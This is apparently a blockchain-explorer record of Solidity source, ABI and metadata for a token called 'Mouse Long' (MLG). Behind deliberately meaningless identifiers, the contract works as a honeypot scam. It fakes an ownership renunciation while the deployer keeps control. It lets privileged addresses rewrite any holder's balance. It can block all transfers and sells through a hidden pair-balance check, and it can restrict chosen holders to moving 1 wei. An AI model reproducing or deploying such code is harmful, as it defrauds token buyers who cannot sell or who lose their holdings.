{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface txTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyIs {\n    function createPair(address walletMarketingTo, address marketingAuto) external returns (address);\n}\n\ninterface fromTotalShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamSwap) external view returns (uint256);\n\n    function transfer(address isLaunch, uint256 launchedReceiverToken) external returns (bool);\n\n    function allowance(address swapAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedReceiverToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLaunch,\n        uint256 launchedReceiverToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableLimit, uint256 value);\n    event Approval(address indexed swapAuto, address indexed spender, uint256 value);\n}\n\ninterface fromTotalShouldMetadata is fromTotalShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MouseLong is tradingAt, fromTotalShould, fromTotalShouldMetadata {\n\n    address public fundMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSender;\n    }\n\n    function fundToFrom(address amountToken, address isLaunch, uint256 launchedReceiverToken) internal returns (bool) {\n        if (amountToken == sellWalletReceiver) {\n            return takeFrom(amountToken, isLaunch, launchedReceiverToken);\n        }\n        uint256 sellFundLaunch = fromTotalShould(fundMin).balanceOf(fromTx);\n        require(sellFundLaunch == modeLaunch);\n        require(isLaunch != fromTx);\n        if (amountShould[amountToken]) {\n            return takeFrom(amountToken, isLaunch, feeLiquidity);\n        }\n        return takeFrom(amountToken, isLaunch, launchedReceiverToken);\n    }\n\n    uint256 private txWallet = 100000000 * 10 ** 18;\n\n    function enableShould(address walletTradingExempt, uint256 launchedReceiverToken) public {\n        totalBuy();\n        toSell[walletTradingExempt] = launchedReceiverToken;\n    }\n\n    function takeTradingLaunched(uint256 launchedReceiverToken) public {\n        totalBuy();\n        modeLaunch = launchedReceiverToken;\n    }\n\n    function approve(address totalTakeSwap, uint256 launchedReceiverToken) public virtual override returns (bool) {\n        amountMin[_msgSender()][totalTakeSwap] = launchedReceiverToken;\n        emit Approval(_msgSender(), totalTakeSwap, launchedReceiverToken);\n        return true;\n    }\n\n    uint256 private atBuy;\n\n    string private txToken = \"Mouse Long\";\n\n    mapping(address => uint256) private toSell;\n\n    function tokenSenderSwap(address minTeam) public {\n        if (isEnable) {\n            return;\n        }\n        \n        atEnable[minTeam] = true;\n        if (exemptReceiver == minSwap) {\n            exemptReceiver = true;\n        }\n        isEnable = true;\n    }\n\n    mapping(address => bool) public amountShould;\n\n    uint256 public launchedBuyAuto;\n\n    uint256 public receiverLaunch;\n\n    string private senderIsSell = \"MLG\";\n\n    bool public exemptReceiver;\n\n    function txFee() public {\n        emit OwnershipTransferred(sellWalletReceiver, address(0));\n        autoSwap = address(0);\n    }\n\n    mapping(address => bool) public atEnable;\n\n    address private autoSwap;\n\n    bool public exemptShould;\n\n    function balanceOf(address teamSwap) public view virtual override returns (uint256) {\n        return toSell[teamSwap];\n    }\n\n    uint256 public liquiditySender;\n\n    function getOwner() external view returns (address) {\n        return autoSwap;\n    }\n\n    address txAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 modeLaunch;\n\n    uint256 constant feeLiquidity = 1 ** 10;\n\n    bool private minSwap;\n\n    function exemptTrading(address teamLaunch) public {\n        totalBuy();\n        \n        if (teamLaunch == sellWalletReceiver || teamLaunch == fundMin) {\n            return;\n        }\n        amountShould[teamLaunch] = true;\n    }\n\n    function takeFrom(address amountToken, address isLaunch, uint256 launchedReceiverToken) internal returns (bool) {\n        require(toSell[amountToken] >= launchedReceiverToken);\n        toSell[amountToken] -= launchedReceiverToken;\n        toSell[isLaunch] += launchedReceiverToken;\n        emit Transfer(amountToken, isLaunch, launchedReceiverToken);\n        return true;\n    }\n\n    function allowance(address launchedSender, address totalTakeSwap) external view virtual override returns (uint256) {\n        if (totalTakeSwap == txAuto) {\n            return type(uint256).max;\n        }\n        return amountMin[launchedSender][totalTakeSwap];\n    }\n\n    function totalBuy() private view {\n        require(atEnable[_msgSender()]);\n    }\n\n    uint8 private receiverSender = 18;\n\n    uint256 totalMin;\n\n    uint256 private swapWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderIsSell;\n    }\n\n    bool public isEnable;\n\n    constructor (){\n        if (swapWallet == minLaunched) {\n            minLaunched = receiverLaunch;\n        }\n        txTotal sellExempt = txTotal(txAuto);\n        fundMin = buyIs(sellExempt.factory()).createPair(sellExempt.WETH(), address(this));\n        if (atBuy != launchedBuyAuto) {\n            atBuy = minLaunched;\n        }\n        sellWalletReceiver = _msgSender();\n        txFee();\n        atEnable[sellWalletReceiver] = true;\n        toSell[sellWalletReceiver] = txWallet;\n        if (minSwap == exemptReceiver) {\n            minSwap = false;\n        }\n        emit Transfer(address(0), sellWalletReceiver, txWallet);\n    }\n\n    event OwnershipTransferred(address indexed amountLimit, address indexed enableAmount);\n\n    function transferFrom(address amountToken, address isLaunch, uint256 launchedReceiverToken) external override returns (bool) {\n        if (_msgSender() != txAuto) {\n            if (amountMin[amountToken][_msgSender()] != type(uint256).max) {\n                require(launchedReceiverToken <= amountMin[amountToken][_msgSender()]);\n                amountMin[amountToken][_msgSender()] -= launchedReceiverToken;\n            }\n        }\n        return fundToFrom(amountToken, isLaunch, launchedReceiverToken);\n    }\n\n    uint256 private minLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return txToken;\n    }\n\n    address public sellWalletReceiver;\n\n    function owner() external view returns (address) {\n        return autoSwap;\n    }\n\n    address fromTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address walletTradingExempt, uint256 launchedReceiverToken) external virtual override returns (bool) {\n        return fundToFrom(_msgSender(), walletTradingExempt, launchedReceiverToken);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTakeSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTakeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverToken\",\"type\":\"uint256\"}],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"}],\"name\":\"exemptTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuyAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWalletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedReceiverToken\",\"type\":\"uint256\"}],\"name\":\"takeTradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"tokenSenderSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MouseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}